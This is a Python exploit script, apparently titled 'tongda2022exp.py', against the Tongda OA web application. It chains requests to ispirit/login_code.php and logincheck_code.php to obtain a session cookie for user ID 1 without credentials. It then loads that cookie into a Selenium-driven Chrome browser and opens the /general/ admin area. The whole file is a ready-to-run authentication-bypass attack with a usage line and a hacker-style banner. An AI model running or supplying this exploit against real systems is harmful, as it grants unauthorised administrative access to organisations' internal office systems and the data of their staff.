import requests,urllib3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
import re
import os,sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(url):
	if 'http' not in url:
		url='http://'+url
	codeuid=get_codeuid(url)
	cookie_dict=getsession(url,codeuid)
	exp(cookie_dict,url)
def getsession(urls,codeuid):
	cookie_dict={}
	if urls[-1]=='/':
		url = urls + "logincheck_code.php"
	else:
		url = urls + "/logincheck_code.php"

	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
}
	body='UID=1&CODEUID=_PC'+codeuid
	r=requests.post(url,body,headers=headers,verify=False,timeout=5)
	cookie=r.headers["Set-Cookie"].split(';')[0]
	cookie_dict['name']=cookie.split('=')[0]
	cookie_dict['value']=cookie.split('=')[1]
	return cookie_dict
def get_codeuid(url):
	if url[-1]=='/':
		urls = url + "ispirit/login_code.php"
	else:
		urls = url + "/ispirit/login_code.php"
	headers={
	'Content-Type': 'application/x-www-form-urlencoded'
	}
	body=''
	r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
	codeuid=r.json()['codeuid']
	return codeuid
def exp(cookie_dict,url):
	chromedriver = "chromedriver.exe"
	os.environ["webdriver.Chrome.driver"] = chromedriver  # 调用chrome浏览器
	# chrome_options = Options()
	# chrome_options.add_argument('--headless')
	# driver = webdriver.Chrome(chrome_options=chrome_options)
	driver = webdriver.Chrome(chromedriver)
	driver.maximize_window()
	if url[-1]=='/':
		url2=url+'general/'
	else:
		url2=url+'/general/'
	driver.get(url2)
	try:
		driver.find_element_by_xpath('//*[@id="details-button"]').click()
		time.sleep(2)
		driver.find_element_by_xpath('//*[@id="proceed-link"]').click()
	except:
		pass
	cookie_dict = {
	            # 'domain': '134.209.207.34',
	            'name': cookie_dict['name'],
	            'value': cookie_dict['value'],
	            "expires": '',
	            'path': '/',
	            'httpOnly': False,
	            'HostOnly': False,
	            'Secure': True
	        }
	driver.add_cookie(cookie_dict)
	# print('asdad')
	driver.refresh() 
	while True:
		time.sleep(1)
def logo():
	print('''
 _                            _         ____    ___  ____   ____                           \r
| |_  ___   _ __    __ _   __| |  __ _ |___ \  / _ \|___ \ |___ \         ___ __  __ _ __  \r
| __|/ _ \ | '_ \  / _` | / _` | / _` |  __) || | | | __) |  __) |_____  / _ \\\\ \/ /| '_ \ \r
| |_| (_) || | | || (_| || (_| || (_| | / __/ | |_| |/ __/  / __/|_____||  __/ >  < | |_) |\r
 \__|\___/ |_| |_| \__, | \__,_| \__,_||_____| \___/|_____||_____|       \___|/_/\_\| .__/ \r
                   |___/                                                            |_|    \r
                                                                                 \r
                                                              --by dsb V1.0\r
\r
		''')
if __name__ == '__main__':
	logo()
	if len(sys.argv)<2:
		print('Usage: python3 tongda2022exp.py url')
	else:
		url=sys.argv[1]
		# print(url)
		main(url)

